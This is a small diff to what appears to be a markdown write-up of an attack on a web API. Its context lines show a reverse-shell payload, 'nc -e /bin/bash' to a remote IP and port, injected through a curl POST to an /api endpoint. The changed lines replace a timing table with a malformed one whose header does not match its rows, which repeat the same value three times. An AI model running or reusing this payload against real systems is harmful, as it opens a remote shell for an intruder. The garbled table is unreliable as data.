@@ -75,6 +75,8 @@ Payload: nc -e /bin/bash 10.10.5.10 9999 | Can be replaced by any other form of 
 curl -x POST -d "request=nc -e /bin/bash 10.10.5.10 9999" http://10.10.10.10:5000/api
 ```
 
-| Attempt | #1 | #2 |
-| :---: | :---: | :---: |
-| Seconds | 301 | 283 |
+| Function | Description | 
+| :---: | :---: | 
+| Seconds | 301 |
+| Seconds | 301 |
+| Seconds | 301 |
